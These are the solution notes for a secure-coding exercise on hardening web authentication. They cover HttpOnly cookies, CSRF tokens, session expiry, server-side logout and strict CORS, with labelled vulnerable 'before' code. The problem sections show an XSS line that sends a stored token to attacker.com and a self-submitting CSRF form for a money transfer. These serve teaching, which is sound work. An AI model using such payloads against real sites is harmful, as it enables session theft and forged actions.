# Solution Notes - Exercise 2: Secure Authentication

## All Authentication Vulnerabilities Fixed! ✅

---

## Security Improvements Summary

| Vulnerability | Before ❌ | After ✅ |
|---------------|----------|---------|
| Token Storage | localStorage | HttpOnly Cookie |
| XSS Protection | None | HttpOnly prevents access |
| CSRF Protection | None | CSRF tokens + SameSite |
| Session Expiration | Never | 1 hour |
| Logout | Client-side only | Server invalidates |
| Cross-Origin | Any origin | Specific origin only |

---

## Fix #1: HttpOnly Cookies Instead of localStorage

### Problem
```javascript
// ❌ VULNERABLE
localStorage.setItem('authToken', token);

// Any XSS can steal it:
fetch('https://attacker.com?token=' + localStorage.getItem('authToken'));
```

### Solution - Backend
```javascript
// ✅ server/index.js
res.cookie('session', sessionToken, {
  httpOnly: true,          // ✅ JavaScript cannot access
  secure: true,            // ✅ HTTPS only (production)
  sameSite: 'strict',      // ✅ CSRF protection
  maxAge: 3600000          // ✅ Expires in 1 hour
});
```

### Solution - Frontend
```javascript
// ✅ authService.js
const response = await fetch('/api/auth/login', {
  method: 'POST',
  credentials: 'include',  // ✅ Send/receive cookies automatically
  body: JSON.stringify({ email, password })
});

// ✅ No localStorage! Cookie is HttpOnly
// Even if XSS exists, attacker cannot steal the session cookie
```

**Why HttpOnly?**
- JavaScript cannot read `document.cookie`
- XSS attacks cannot steal the session
- Browser automatically sends cookie with requests

---

## Fix #2: CSRF Protection

### Problem
```javascript
// ❌ No CSRF protection
// Attacker can make requests on behalf of logged-in user
```

**Attack scenario:**
```html
<!-- Attacker's website -->
<form action="http://yoursite.com/api/transfer" method="POST">
  <input name="to" value="attacker@evil.com">
  <input name="amount" value="1000">
</form>
<script>document.forms[0].submit()</script>
```

### Solution - Backend
```javascript
// ✅ Generate CSRF token on login
const csrfToken = crypto.randomBytes(32).toString('hex');

sessions.set(sessionToken, {
  userId: user.id,
  csrfToken,  // ✅ Store with session
  createdAt: Date.now()
});

// Return CSRF token to client
res.json({ user, csrfToken });
```

```javascript
// ✅ Verify CSRF token on state-changing requests
function verifyCsrf(req, res, next) {
  const csrfToken = req.headers['x-csrf-token'];

  if (!csrfToken || csrfToken !== req.session.csrfToken) {
    return res.status(403).json({ error: 'Invalid CSRF token' });
  }

  next();
}

app.post('/api/logout', requireAuth, verifyCsrf, (req, res) => {
  // Protected against CSRF
});
```

### Solution - Frontend
```javascript
// ✅ Store CSRF token in memory (not localStorage)
let csrfToken = null;

// Receive on login
const { user, csrfToken: token } = await response.json();
csrfToken = token;

// Include in requests
await fetch('/api/logout', {
  method: 'POST',
  credentials: 'include',
  headers: {
    'X-CSRF-Token': csrfToken  // ✅ Include token
  }
});
```

**Why it works:**
- Attacker cannot read CSRF token (different origin)
- Attacker's form cannot set custom headers
- SameSite cookie adds additional protection

---

## Fix #3: Session Expiration

### Problem
```javascript
// ❌ Sessions never expire
sessions.set(token, {
  userId: user.id
  // No createdAt, no expiration check!
});
```

### Solution
```javascript
// ✅ Track creation time
sessions.set(sessionToken, {
  userId: user.id,
  csrfToken,
  createdAt: Date.now()  // ✅ Track when created
});

// ✅ Check expiration on every request
function requireAuth(req, res, next) {
  const session = sessions.get(sessionToken);

  const SESSION_DURATION = 60 * 60 * 1000; // 1 hour

  if (Date.now() - session.createdAt > SESSION_DURATION) {
    sessions.delete(sessionToken);
    res.clearCookie('session');
    return res.status(401).json({ error: 'Session expired' });
  }

  next();
}

// ✅ Periodic cleanup
setInterval(() => {
  const now = Date.now();
  for (const [token, session] of sessions.entries()) {
    if (now - session.createdAt > SESSION_DURATION) {
      sessions.delete(token);
    }
  }
}, 15 * 60 * 1000); // Every 15 minutes
```

**Cookie also expires:**
```javascript
res.cookie('session', token, {
  maxAge: 3600000  // ✅ Browser deletes after 1 hour
});
```

---

## Fix #4: Proper Logout

### Problem
```javascript
// ❌ Client-side only logout
localStorage.removeItem('authToken');
// Server session still valid!
```

### Solution - Backend
```javascript
// ✅ Delete session from server
app.post('/api/auth/logout', requireAuth, verifyCsrf, (req, res) => {
  const sessionToken = req.cookies.session;

  sessions.delete(sessionToken);  // ✅ Actually delete!
  res.clearCookie('session');

  res.json({ message: 'Logged out' });
});
```

### Solution - Frontend
```javascript
// ✅ Call server logout
logout: async () => {
  await fetch('/api/auth/logout', {
    method: 'POST',
    credentials: 'include',
    headers: {
      'X-CSRF-Token': csrfToken
    }
  });

  csrfToken = null;
}
```

---

## Fix #5: SameSite Cookies

### Problem
```javascript
// ❌ Cookies sent with cross-site requests
// Vulnerable to CSRF
```

### Solution
```javascript
// ✅ SameSite attribute
res.cookie('session', token, {
  sameSite: 'strict'  // ✅ Never sent cross-site
});
```

**Options:**
- `strict` - Never sent cross-site (safest, but UX impact)
- `lax` - Sent on top-level GET navigation
- `none` - Always sent (requires `secure: true`)

**Strict is best** for auth cookies!

---

## Fix #6: Specific CORS Configuration

### Problem
```javascript
// ❌ Allows any origin
app.use(cors({
  origin: true  // Allows any origin!
}));
```

### Solution
```javascript
// ✅ Specific origin only
app.use(cors({
  origin: 'http://localhost:5173',  // ✅ Specific domain
  credentials: true                 // ✅ Allow cookies
}));

// Production:
// origin: 'https://yourapp.com'
```

---

## Complete Security Flow

### 1. Login
```
Client                          Server
  |                               |
  |-- POST /api/auth/login ------>|
  |   { email, password }         |
  |                               |--- Validate credentials
  |                               |--- Generate session token
  |                               |--- Generate CSRF token
  |                               |--- Store session
  |                               |
  |<-- Set-Cookie: session -------|
  |    HttpOnly, Secure,          |
  |    SameSite=Strict            |
  |                               |
  |<-- { user, csrfToken } -------|
  |                               |
  |--- Store CSRF in memory       |
```

### 2. Authenticated Request
```
Client                          Server
  |                               |
  |-- GET /api/auth/me ---------->|
  |   Cookie: session             |
  |   X-CSRF-Token: ...           |
  |                               |--- Validate session cookie
  |                               |--- Check expiration
  |                               |--- Verify CSRF token
  |                               |
  |<-- { user } -------------------|
```

### 3. Logout
```
Client                          Server
  |                               |
  |-- POST /api/auth/logout ----->|
  |   Cookie: session             |
  |   X-CSRF-Token: ...           |
  |                               |--- Validate session
  |                               |--- Verify CSRF
  |                               |--- Delete session
  |                               |
  |<-- Clear-Cookie: session -----|
  |                               |
  |--- Clear CSRF from memory     |
```

---

## Before vs After Testing

### Before (Vulnerable)
```javascript
// Can steal token
console.log(localStorage.getItem('authToken'));
// Outputs: "token_1_1234567890" ❌

// Session never expires
// Logout doesn't work (can re-set token)
```

### After (Secure)
```javascript
// Cannot access token
console.log(localStorage.getItem('authToken'));
// Outputs: null ✅

console.log(document.cookie);
// Doesn't show session cookie (HttpOnly) ✅

// Session expires after 1 hour ✅
// Logout invalidates server session ✅
// CSRF protection active ✅
```

---

## Production Considerations

### 1. Password Hashing
```javascript
// ❌ Plain text (example only!)
password: 'password123'

// ✅ Use bcrypt
const bcrypt = require('bcrypt');
const hash = await bcrypt.hash(password, 10);
```

### 2. Secure Session Storage
```javascript
// ❌ In-memory Map (lost on restart)
const sessions = new Map();

// ✅ Use Redis
const redis = require('redis');
const client = redis.createClient();
await client.set(`session:${token}`, JSON.stringify(session), {
  EX: 3600 // Expire in 1 hour
});
```

### 3. HTTPS Only
```javascript
res.cookie('session', token, {
  secure: true,  // ✅ HTTPS only in production
  sameSite: 'none' // If cross-domain
});
```

### 4. Rate Limiting
```javascript
const rateLimit = require('express-rate-limit');

const loginLimiter = rateLimit({
  windowMs: 15 * 60 * 1000, // 15 minutes
  max: 5 // 5 attempts
});

app.post('/api/auth/login', loginLimiter, (req, res) => {
  // Protected against brute force
});
```

### 5. Refresh Tokens
```javascript
// Issue long-lived refresh token
// Issue short-lived access token
// Refresh token can be revoked
```

---

## Key Learnings

### ✅ DO:
- Use HttpOnly cookies for session tokens
- Implement CSRF protection (token + SameSite)
- Set session expiration
- Invalidate sessions on logout
- Use specific CORS origins
- Hash passwords with bcrypt
- Use secure session storage (Redis)
- Enable HTTPS in production
- Implement rate limiting

### ❌ DON'T:
- Never store auth tokens in localStorage
- Never allow indefinite sessions
- Never skip server-side logout
- Never allow all CORS origins
- Never store plain-text passwords
- Never rely on client-side security alone

---

## Congratulations! 🎉

You've successfully:
- ✅ Replaced localStorage with HttpOnly cookies
- ✅ Implemented CSRF protection
- ✅ Added session expiration
- ✅ Fixed logout to invalidate sessions
- ✅ Configured SameSite cookies
- ✅ Secured CORS configuration

**Your authentication is now much more secure!** 🔒

